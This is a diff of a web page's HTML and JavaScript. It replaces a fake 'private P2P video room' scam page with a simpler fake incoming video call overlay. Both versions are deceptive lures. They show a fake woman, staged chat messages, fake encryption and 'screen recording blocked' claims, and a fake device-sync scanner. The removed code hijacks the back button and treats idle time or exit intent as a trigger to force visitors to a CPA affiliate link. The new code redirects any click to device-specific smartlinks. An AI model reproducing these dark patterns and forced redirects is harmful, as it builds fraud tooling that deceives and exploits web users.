@@ -3,357 +3,168 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Encrypted P2P Room - 1/1</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <title>Dashboard - Private Chat</title>
     <style>
-        body { background-color: #020617; color: #f8fafc; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; overflow-x: hidden; user-select: none; }
-        .glass-panel { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.05); }
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #0b1121;
+            color: white;
+            overflow: hidden; 
+        }
+
+        .dashboard-blur {
+            width: 100vw;
+            height: 100vh;
+            background-image: url('image_0f43c1.png');
+            background-color: #0b1121;
+            background-size: cover;
+            background-position: center;
+            filter: blur(8px); 
+            transition: filter 0.5s ease;
+        }
+
+        .fake-call-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            cursor: pointer; 
+        }
+
+        .caller-info {
+            text-align: center;
+            margin-bottom: 50px;
+        }
         
-        /* Trick: Pulse & Glows */
-        .glow-btn { animation: glow 2s infinite alternate; }
-        @keyframes glow { 0% { box-shadow: 0 0 10px #3b82f6; } 100% { box-shadow: 0 0 30px #3b82f6, 0 0 50px #3b82f6; } }
+        .caller-info img {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            border: 3px solid #25D366;
+            box-shadow: 0 0 20px #25D366;
+            animation: pulse 1.5s infinite; 
+        }
         
-        .pulse-wave { position: absolute; border: 2px solid #3b82f6; border-radius: 50%; animation: pulsewave 2s infinite linear; opacity: 0; }
-        .pulse-wave:nth-child(2) { animation-delay: 1s; }
-        @keyframes pulsewave { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(2.5); opacity: 0; } }
-
-        /* Trick: Floating Hearts */
-        .heart-float { position: absolute; bottom: -20px; right: 20px; font-size: 1.2rem; color: #ec4899; opacity: 0; animation: floatUp 4s ease-in-out infinite; z-index: 50; }
-        .heart-float:nth-child(2) { animation-delay: 1.5s; right: 45px; font-size: 1rem; color: #ef4444; }
-        .heart-float:nth-child(3) { animation-delay: 3s; right: 10px; font-size: 1.5rem; color: #8b5cf6; }
-        @keyframes floatUp { 0% { transform: translateY(0) scale(1) rotate(0deg); opacity: 0; } 20% { opacity: 0.9; } 100% { transform: translateY(-150px) scale(1.3) rotate(20deg); opacity: 0; } }
-
-        /* Trick: Audio Equalizer */
-        .bar { width: 3px; background: #22c55e; border-radius: 3px; animation: eq 1s ease-in-out infinite alternate; display: inline-block; margin: 0 1px; }
-        .bar:nth-child(1) { animation-delay: 0.1s; height: 10px; }
-        .bar:nth-child(2) { animation-delay: 0.3s; height: 16px; }
-        .bar:nth-child(3) { animation-delay: 0.5s; height: 12px; }
-        .bar:nth-child(4) { animation-delay: 0.2s; height: 18px; }
-        .bar:nth-child(5) { animation-delay: 0.4s; height: 14px; }
-        @keyframes eq { 0% { height: 4px; } 100% { height: 18px; } }
-
-        /* Trick: Typing & Haptic */
-        .dot-flashing { position: relative; width: 4px; height: 4px; border-radius: 5px; background-color: #60a5fa; color: #60a5fa; animation: dot-flashing 1s infinite linear alternate; animation-delay: 0.5s; }
-        .dot-flashing::before, .dot-flashing::after { content: ''; display: inline-block; position: absolute; top: 0; width: 4px; height: 4px; border-radius: 5px; background-color: #60a5fa; color: #60a5fa; animation: dot-flashing 1s infinite alternate; }
-        .dot-flashing::before { left: -10px; animation-delay: 0s; }
-        .dot-flashing::after { left: 10px; animation-delay: 1s; }
-        @keyframes dot-flashing { 0% { background-color: #60a5fa; } 50%, 100% { background-color: rgba(96, 165, 250, 0.2); } }
-
-        .vibrate-ring { animation: vibrate 0.2s linear infinite both; }
-        @keyframes vibrate { 0%, 100% { transform: translate(0); } 25% { transform: translate(-2px, 2px); } 50% { transform: translate(2px, -2px); } 75% { transform: translate(-2px, -2px); } }
-
-        .bg-heavy-blur { filter: blur(15px) brightness(0.3); transition: all 0.5s ease; }
+        .caller-info h2 {
+            font-size: 26px;
+            margin-top: 20px;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
         
-        /* Trick: Hold Fill */
-        .hold-btn { position: relative; overflow: hidden; }
-        .hold-fill { position: absolute; top: 0; left: 0; height: 100%; background: rgba(255,255,255,0.3); width: 0%; transition: width 0.1s linear; pointer-events: none; }
-        
-        /* Trick: Progress Bar Timeout */
-        .time-bar { width: 100%; height: 2px; background: #ef4444; animation: shrink 30s linear forwards; }
-        @keyframes shrink { from { width: 100%; } to { width: 0%; } }
+        .caller-info p {
+            font-size: 16px;
+            color: #00ff00;
+            margin-top: 5px;
+        }
 
-        .hide-scrollbar::-webkit-scrollbar { display: none; }
+        .call-buttons {
+            display: flex;
+            gap: 50px;
+        }
+        
+        .btn {
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 16px;
+            font-weight: bold;
+            color: white;
+            animation: shake 0.5s infinite; 
+        }
+        
+        .btn-accept {
+            background-color: #25D366;
+            box-shadow: 0 0 25px #25D366;
+        }
+        
+        .btn-decline {
+            background-color: #FF3B30;
+            box-shadow: 0 0 25px #FF3B30;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 10px #25D366; transform: scale(1); }
+            50% { box-shadow: 0 0 35px #25D366; transform: scale(1.05); }
+            100% { box-shadow: 0 0 10px #25D366; transform: scale(1); }
+        }
+        
+        @keyframes shake {
+            0% { transform: rotate(0deg); }
+            25% { transform: rotate(-8deg); }
+            50% { transform: rotate(0deg); }
+            75% { transform: rotate(8deg); }
+            100% { transform: rotate(0deg); }
+        }
     </style>
 </head>
-<body class="antialiased h-screen overflow-hidden" id="mainBody">
+<body>
 
-    <!-- TRICK 4: Privacy Toast -->
-    <div id="privacyToast" class="fixed top-24 left-1/2 transform -translate-x-1/2 z-[100] bg-gray-900/90 border border-gray-700 text-white rounded-full px-5 py-2 shadow-2xl flex items-center gap-2 text-[10px] opacity-0 transition-all duration-500 backdrop-blur-md">
-        <i class="fas fa-shield-alt text-green-500"></i> Screen Recording Blocked by Host
-    </div>
+    <div class="dashboard-blur"></div>
 
-    <!-- MAIN WRAPPER (Click anywhere triggers CPA trap) -->
-    <div id="contentWrapper" class="h-full overflow-y-auto pb-40 transition-all duration-700 hide-scrollbar" onclick="triggerTrap(event)">
-        
-        <!-- TRICK 16: Host is waiting bar -->
-        <div class="fixed top-0 left-0 w-full z-[70]"><div class="time-bar"></div></div>
+    <audio id="ringtone" loop>
+        <source src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Phone_ringing.ogg" type="audio/ogg">
+    </audio>
 
-        <nav class="sticky top-0 z-[60] glass-panel border-b border-gray-800 shadow-2xl">
-            <div class="max-w-7xl mx-auto px-3 py-3 flex justify-between items-center">
-                <div class="flex items-center gap-3">
-                    <div class="relative">
-                        <img src="https://lh3.googleusercontent.com/d/1rm_yVBE3kEiCDoAfI2bWr6bOm9TDqGGm" class="w-11 h-11 rounded-full border-2 border-blue-500 object-cover shadow-[0_0_10px_#3b82f6]">
-                        <!-- TRICK 12: Blinking REC dot -->
-                        <span class="absolute -bottom-1 -right-1 w-4 h-4 bg-red-500 border-2 border-[#020617] rounded-full animate-pulse flex items-center justify-center"><i class="fas fa-video text-[7px] text-white"></i></span>
-                    </div>
-                    <div>
-                        <h1 class="font-black text-base tracking-tight flex items-center gap-1 text-gray-100">Viola <i class="fas fa-check-circle text-blue-400 text-xs"></i></h1>
-                        <!-- TRICK 1: 1/1 Guest & TRICK 18: Crossed Eye -->
-                        <p class="text-[9px] text-green-400 font-bold uppercase tracking-widest flex items-center gap-1">
-                            <i class="fas fa-eye-slash"></i> 1/1 Private Room (You)
-                        </p>
-                    </div>
-                </div>
-                <!-- TRICK 2: Hold to Sync -->
-                <button onmousedown="startHold()" onmouseup="endHold()" ontouchstart="startHold()" ontouchend="endHold()" class="hold-btn bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-black px-4 py-2.5 rounded-lg text-[10px] shadow-[0_0_20px_rgba(37,99,235,0.5)] uppercase tracking-widest flex items-center gap-2 border border-blue-400/30">
-                    <i class="fas fa-fingerprint text-sm animate-pulse"></i> Hold to Sync
-                    <div id="holdFill" class="hold-fill"></div>
-                </button>
-            </div>
-        </nav>
-
-        <main class="max-w-5xl mx-auto px-3 mt-4 space-y-6">
-            
-            <!-- TOP STATS -->
-            <div class="flex justify-between items-center px-2">
-                <!-- TRICK 5: Live Ping -->
-                <div class="text-[9px] font-mono text-gray-500 flex items-center gap-1 bg-gray-900/50 px-2 py-1 rounded-full">
-                    <i class="fas fa-satellite-dish text-green-500"></i> Ping: <span id="pingCounter">21</span>ms
-                </div>
-                <!-- TRICK 22 & 10: Badges -->
-                <div class="flex gap-2">
-                    <span class="text-[9px] bg-green-900/40 text-green-400 border border-green-700/50 px-2 py-1 rounded shadow-lg uppercase font-bold"><i class="fas fa-lock"></i> HD+ Encrypted</span>
-                    <span class="text-[9px] bg-blue-900/40 text-blue-400 border border-blue-700/50 px-2 py-1 rounded shadow-lg uppercase font-bold"><i class="fas fa-gift"></i> 100% Free</span>
-                </div>
-            </div>
-
-            <!-- STREAM TRAP -->
-            <div class="relative glass-panel rounded-3xl overflow-hidden shadow-2xl border border-gray-800 bg-black aspect-[4/3] sm:aspect-video">
-                <iframe src="https://drive.google.com/file/d/1LRMGcb6aSB2RzRTF0lcmLB7BfQYE3As-/preview" class="w-full h-full pointer-events-none opacity-60 filter blur-[3px]" frameborder="0"></iframe>
-                
-                <!-- TRICK 24: Unmute Overlay CTA -->
-                <div class="absolute inset-0 z-10 flex flex-col items-center justify-center cursor-pointer bg-black/20 backdrop-blur-[1px]">
-                    <div class="relative flex items-center justify-center">
-                        <div class="pulse-wave w-24 h-24"></div>
-                        <div class="pulse-wave w-24 h-24"></div>
-                        <div class="bg-blue-600/90 backdrop-blur-md text-white px-8 py-5 rounded-2xl flex flex-col items-center gap-2 shadow-[0_0_40px_rgba(37,99,235,0.6)] glow-btn border border-blue-400/50 transform transition hover:scale-110 z-10">
-                            <i class="fas fa-play text-4xl mb-1"></i>
-                            <span class="text-sm md:text-xl font-black tracking-widest">TAP TO SYNC VIDEO</span>
-                            <span class="text-[8px] text-blue-200 uppercase font-mono tracking-widest">Bypassing local restrictions...</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- TRICK 11: Audio Equalizer & TRICK 8: Floating Hearts -->
-                <div class="absolute bottom-4 left-4 z-20 flex items-center gap-2 bg-black/60 px-3 py-1.5 rounded-full backdrop-blur-md border border-gray-700">
-                    <i class="fas fa-microphone-alt text-gray-400 text-xs"></i>
-                    <div class="flex items-end h-4">
-                        <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
-                    </div>
-                </div>
-                
-                <div class="absolute bottom-0 right-0 w-20 h-40 pointer-events-none overflow-hidden z-20">
-                    <i class="fas fa-heart heart-float"></i>
-                    <i class="fas fa-heart heart-float"></i>
-                    <i class="fas fa-heart heart-float"></i>
-                </div>
-            </div>
-
-            <!-- CHAT SYSTEM -->
-            <div class="glass-panel rounded-2xl p-4 flex flex-col relative border border-gray-800 shadow-xl max-h-[250px]">
-                <div class="border-b border-gray-700/50 pb-2 mb-3 flex justify-between items-center relative">
-                    <h3 class="font-bold text-xs uppercase text-gray-400 tracking-wider">Direct Handshake Chat</h3>
-                    <!-- TRICK 23: Fake Notification Dot -->
-                    <span class="absolute top-0 left-40 w-2 h-2 bg-red-500 rounded-full animate-ping"></span>
-                    <span class="text-[9px] text-blue-400 bg-blue-900/30 px-2 py-0.5 rounded border border-blue-800/50"><i class="fas fa-network-wired"></i> Secure P2P</span>
-                </div>
-                
-                <div id="chatBox" class="flex-1 overflow-y-auto space-y-3 pr-2 pb-6 text-xs hide-scrollbar">
-                    <div class="text-center text-[9px] text-yellow-500/70 my-1 bg-yellow-900/20 py-1 rounded">System: Room isolated. Encrypted tunnel active.</div>
-                    
-                    <div class="flex gap-2 opacity-0 transform translate-y-4 transition-all duration-500" id="msg1">
-                        <img src="https://lh3.googleusercontent.com/d/1rm_yVBE3kEiCDoAfI2bWr6bOm9TDqGGm" class="w-7 h-7 rounded-full border border-blue-500/50">
-                        <div class="bg-gray-800 text-gray-200 p-2.5 rounded-xl rounded-tl-none border border-gray-700 shadow-md">
-                            Hey... I made this room just for us. 🙈
-                        </div>
-                    </div>
-                    
-                    <!-- TRICK 6: Typing Indicator -->
-                    <div id="typingIndicator" class="flex gap-2 items-center text-gray-500 pl-9 hidden mt-2">
-                        <span class="text-[9px] uppercase tracking-widest font-bold">Viola typing</span>
-                        <div class="dot-flashing ml-3 mt-1"></div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- TRICK 7 & 21: EXPANDED VAULT -->
-            <div>
-                <h2 class="text-sm font-black mb-3 uppercase tracking-widest text-gray-400 flex items-center gap-2">
-                    <i class="fas fa-folder-open text-blue-500"></i> Locked Private Album <span class="text-[9px] bg-gray-800 px-2 py-1 rounded text-gray-500 ml-auto">Scroll to reveal</span>
-                </h2>
-                <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
-                    <div class="relative w-full aspect-square rounded-xl overflow-hidden shadow-lg border border-gray-800">
-                        <img src="https://lh3.googleusercontent.com/d/1iNO8WxlL3pGdE6UH3Jq3ydqEw0Jt6wev" class="w-full h-full object-cover filter blur-[2px] opacity-80">
-                    </div>
-                    <div class="relative w-full aspect-square rounded-xl overflow-hidden shadow-lg border border-gray-800">
-                        <img src="https://lh3.googleusercontent.com/d/1jsB8fD6065rWm5xR4G7WFqG67wvDf5Bo" class="w-full h-full object-cover filter blur-md opacity-70">
-                        <div class="absolute inset-0 flex items-center justify-center"><i class="fas fa-unlock text-2xl text-white/50 drop-shadow-lg"></i></div>
-                    </div>
-                    <div class="relative w-full aspect-square rounded-xl overflow-hidden shadow-lg border border-gray-800 col-span-2 md:col-span-1">
-                        <img src="https://lh3.googleusercontent.com/d/1AfkMXXwkgxtFARxT27dVKmAZeVStpaZR" class="w-full h-full object-cover filter blur-[12px] opacity-60">
-                        <div class="absolute inset-0 bg-black/50 flex flex-col items-center justify-center text-center">
-                            <i class="fas fa-sync fa-spin text-blue-400 text-2xl mb-2"></i>
-                            <span class="text-[9px] font-black text-white bg-blue-600/90 px-3 py-1 rounded shadow-lg uppercase tracking-wider">Tap to Sync & View</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- TRICK 21: Terms / TOS Trap -->
-            <div class="text-center pb-8 pt-4">
-                <p class="text-[8px] text-gray-600 font-mono">By staying on this page, you authorize a secure device sync.<br>Node: 192.168.x.x (Encrypted) • 0% Fees Guaranteed.</p>
-            </div>
-        </main>
-    </div>
-
-    <!-- TRICK 15: THE ULTIMATE SYNC SCANNER MODAL (Hidden default) -->
-    <div id="scannerModal" class="fixed inset-0 bg-[#020617]/98 z-[600] hidden flex-col items-center justify-center p-6 backdrop-blur-2xl">
-        <div class="relative mb-8 flex justify-center items-center">
-            <!-- Ripple behind icon -->
-            <div class="absolute w-32 h-32 border border-blue-500 rounded-full animate-ping opacity-30"></div>
-            <i class="fas fa-fingerprint text-7xl text-blue-500 opacity-20"></i>
-            <i class="fas fa-fingerprint text-7xl text-blue-400 absolute top-0" style="clip-path: polygon(0 0, 100% 0, 100% 50%, 0 50%); animation: scanMove 1.5s infinite linear alternate;"></i>
+    <div class="fake-call-overlay" id="magicOverlay" onclick="redirectToSmartlink()">
+        <div class="caller-info">
+            <img src="https://via.placeholder.com/120/ff69b4/ffffff?text=Live+Cam" alt="Caller">
+            <h2>Incoming Video Call...</h2>
+            <p>Connecting Secure P2P Line</p>
         </div>
         
-        <h2 class="text-2xl font-black text-white mb-2 uppercase tracking-[0.2em] text-center drop-shadow-[0_0_10px_rgba(59,130,246,0.8)]" id="scanText">SYNCING DEVICE</h2>
-        
-        <!-- TRICK 19: Dynamic Device Optimizer Text -->
-        <p class="text-[10px] text-blue-300 mb-8 font-mono bg-blue-900/30 px-4 py-1.5 rounded border border-blue-800/50" id="subScanText">
-            <i class="fas fa-cog fa-spin mr-1"></i> Optimizing for Mobile Browser...
-        </p>
-        
-        <div class="w-full max-w-xs h-2 bg-gray-900 rounded-full overflow-hidden border border-gray-800 relative">
-            <div id="scanBar" class="h-full bg-gradient-to-r from-blue-600 to-cyan-400 w-0 transition-all duration-[600ms] shadow-[0_0_15px_#22d3ee] relative">
-                <div class="absolute top-0 right-0 bottom-0 w-4 bg-white/50 blur-[2px]"></div>
-            </div>
-        </div>
-        <!-- TRICK 17: Node Locator -->
-        <p class="text-[8px] text-gray-500 mt-4 font-mono">Establishing P2P Handshake via nearest secure node...</p>
-    </div>
-
-    <!-- TRICK 3: DELAYED NATIVE CALL OVERLAY -->
-    <div id="masterCallOverlay" class="fixed inset-0 bg-[#000000] z-[500] flex flex-col items-center justify-between py-16 hidden transition-opacity duration-300">
-        
-        <div class="w-full px-6 text-center pt-10">
-            <!-- TRICK 12: Mic glitch text -->
-            <div class="flex items-center justify-center gap-2 text-gray-400 text-[9px] mb-10 font-bold tracking-[0.2em] uppercase bg-gray-900/80 py-1.5 px-4 rounded-full w-max mx-auto border border-gray-700">
-                <i class="fas fa-lock text-green-500"></i> Direct P2P Video Active
-            </div>
-            
-            <div class="relative w-40 h-40 mx-auto mb-8">
-                <div class="absolute inset-0 bg-blue-600/30 rounded-full animate-ping" style="animation-duration: 1.5s;"></div>
-                <div class="absolute inset-[-10px] border border-blue-500/30 rounded-full animate-pulse"></div>
-                <img src="https://lh3.googleusercontent.com/d/1s7tSFoTVbsOFZ8LaJ6MuAvkCXzna3eb-" class="w-full h-full object-cover rounded-full relative z-10 shadow-[0_0_40px_rgba(37,99,235,0.4)] border-2 border-gray-800">
-            </div>
-
-            <h1 class="text-4xl font-light text-white mb-2 tracking-widest">Viola</h1>
-            <p class="text-green-400 text-xs font-mono font-bold tracking-widest" id="callDuration">Incoming Secure Call...</p>
-        </div>
-
-        <div class="w-full px-12 flex justify-between items-end pb-12 max-w-sm mx-auto">
-            <div class="flex flex-col items-center gap-3 cursor-pointer" onclick="triggerTrap(event)">
-                <button class="w-16 h-16 rounded-full bg-gray-800 flex items-center justify-center text-white text-2xl border border-gray-700">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-            
-            <!-- TRICK 14: Haptic Vibration CTA -->
-            <div class="flex flex-col items-center gap-3 cursor-pointer" onclick="triggerTrap(event)">
-                <button class="w-[72px] h-[72px] rounded-full bg-gradient-to-br from-green-400 to-green-600 flex items-center justify-center text-white text-3xl shadow-[0_0_30px_rgba(34,197,94,0.6)] vibrate-ring">
-                    <i class="fas fa-phone" style="transform: rotate(270deg);"></i>
-                </button>
-                <span class="text-white text-[11px] font-black tracking-widest uppercase drop-shadow-md">Accept Sync</span>
-            </div>
+        <div class="call-buttons">
+            <button class="btn btn-decline">Decline</button>
+            <button class="btn btn-accept">Accept</button>
         </div>
     </div>
-
-    <!-- SYSTEM AUDIO -->
-    <audio id="ringAudio" loop src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
-    <audio id="msgAudio" src="https://assets.mixkit.co/active_storage/sfx/2354/2354-preview.mp3"></audio>
 
     <script>
-        // SMARTLINK
-        const CPA_LINK = "https://t.taffizerq.com/click?pid=3844&offer_id=2310"; 
-
-        history.pushState(null, document.title, location.href);
-        window.addEventListener('popstate', function () { window.location.href = CPA_LINK; });
-
-        // MASTER TRAP (Activates sync scanner)
-        function triggerTrap(e) {
-            // Prevent trigger if they are just touching the hold button
-            if(e && e.target && e.target.closest && e.target.closest('.hold-btn')) return;
-
-            document.getElementById('masterCallOverlay').classList.add('hidden');
-            document.getElementById('ringAudio').pause();
-
-            const scanner = document.getElementById('scannerModal');
-            const bar = document.getElementById('scanBar');
-            const text = document.getElementById('scanText');
-            const sub = document.getElementById('subScanText');
-            
-            scanner.classList.remove('hidden');
-            scanner.classList.add('flex');
-            
-            // Accelerated psychological sequence
-            setTimeout(() => { bar.style.width = '25%'; text.innerText = 'LOCATING DEVICE...'; sub.innerHTML = '<i class="fas fa-search"></i> Finding free node...'; }, 300);
-            setTimeout(() => { bar.style.width = '65%'; text.innerText = 'ALLOCATING BANDWIDTH...'; sub.innerHTML = '<i class="fas fa-unlock"></i> Bypassing blocks...'; }, 1000);
-            setTimeout(() => { bar.style.width = '85%'; text.innerText = 'SYNCING MIC/CAM...'; sub.innerHTML = '<i class="fas fa-shield-alt"></i> Injecting encryption keys...'; }, 1800);
-            setTimeout(() => { 
-                bar.style.width = '100%'; 
-                text.innerText = 'SYNC COMPLETE'; 
-                text.classList.replace('text-white', 'text-green-400');
-                sub.innerHTML = 'Redirecting to private feed...';
-            }, 2500);
-            
-            setTimeout(() => { window.open(CPA_LINK, '_self'); }, 3000);
+        // অটোমেটিক ডিভাইস ডিটেকশন সিস্টেম
+        let targetLink = "https://firefone.com/video020"; // ডিফল্ট পিসি লিংক
+        
+        // যদি ইউজার মোবাইল থেকে আসে, অটোমেটিক মোবাইলের লিংক সেট হয়ে যাবে
+        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+            targetLink = "https://firefone.com/bedjfha"; // মোবাইল লিংক
         }
 
-        // HOLD BUTTON LOGIC
-        let holdProgress = 0, holdInterval;
-        function startHold() {
-            holdProgress = 0;
-            holdInterval = setInterval(() => {
-                holdProgress += 20;
-                document.getElementById('holdFill').style.width = holdProgress + '%';
-                if (holdProgress >= 100) { clearInterval(holdInterval); triggerTrap(); }
-            }, 50);
-        }
-        function endHold() { clearInterval(holdInterval); document.getElementById('holdFill').style.width = '0%'; }
+        // স্ক্রিনে টাচ বা ক্লিক করলেই ম্যাজিক শুরু
+        document.body.addEventListener('touchstart', startMagic, { once: true });
+        document.body.addEventListener('click', startMagic, { once: true });
 
-        // LIVE PING SIMULATION
-        setInterval(() => { document.getElementById('pingCounter').innerText = Math.floor(Math.random() * 20) + 12; }, 1500);
-
-        // THE 25-TRICK SEQUENCE TIMELINE
-        function startSequence() {
-            // 1. Show Privacy Toast (Trick 4)
-            setTimeout(() => {
-                const toast = document.getElementById('privacyToast');
-                toast.classList.remove('opacity-0', '-translate-y-4');
-                setTimeout(() => toast.classList.add('opacity-0'), 3000);
-            }, 1500);
-
-            // 2. Chat Message 1 (Trick 13)
-            setTimeout(() => {
-                document.getElementById('msg1').classList.remove('opacity-0', 'translate-y-4');
-                document.getElementById('msgAudio').play().catch(e=>console.log("Audio lock"));
-            }, 2500);
-
-            // 3. Fake Typing Starts (Trick 6)
-            setTimeout(() => { document.getElementById('typingIndicator').classList.remove('hidden'); }, 5000);
-
-            // 4. THE ULTIMATE CALL TRIGGER (Trick 3 & 9)
-            setTimeout(() => {
-                document.getElementById('typingIndicator').classList.add('hidden');
-                document.getElementById('contentWrapper').classList.add('bg-heavy-blur');
-                document.getElementById('masterCallOverlay').classList.remove('hidden');
-                document.getElementById('ringAudio').play().catch(e=>console.log("Audio lock"));
-            }, 12000); // 12 seconds is the sweet spot
+        function startMagic() {
+            // রিংটোন প্লে
+            let audio = document.getElementById('ringtone');
+            audio.play().catch(function(error) {
+                console.log("Waiting for user interaction");
+            });
+            
+            // ফোন ভাইব্রেট
+            if (navigator.vibrate) {
+                navigator.vibrate([500, 250, 500, 250, 500, 250, 500, 250, 500]); 
+            }
         }
 
-        // TRICK 25: Exit Intent Trap (If mouse leaves top of screen or idle for 20s)
-        let inactivityTimeout = setTimeout(() => { if(document.getElementById('masterCallOverlay').classList.contains('hidden')) triggerTrap(); }, 20000);
-        document.addEventListener('mousemove', (e) => {
-            clearTimeout(inactivityTimeout);
-            inactivityTimeout = setTimeout(() => { if(document.getElementById('masterCallOverlay').classList.contains('hidden')) triggerTrap(); }, 20000);
-            if (e.clientY < 10) triggerTrap(); 
-        });
-
-        const style = document.createElement('style');
-        style.innerHTML = `@keyframes scanMove { 0% { top: -10px; } 100% { top: 10px; } }`;
-        document.head.appendChild(style);
-
-        window.addEventListener('DOMContentLoaded', startSequence);
+        // যেকোনো জায়গায় ক্লিক করলেই সোজা লিংকে চলে যাবে
+        function redirectToSmartlink() {
+            if (navigator.vibrate) { navigator.vibrate(100); }
+            window.location.href = targetLink;
+        }
     </script>
+
 </body>
 </html>
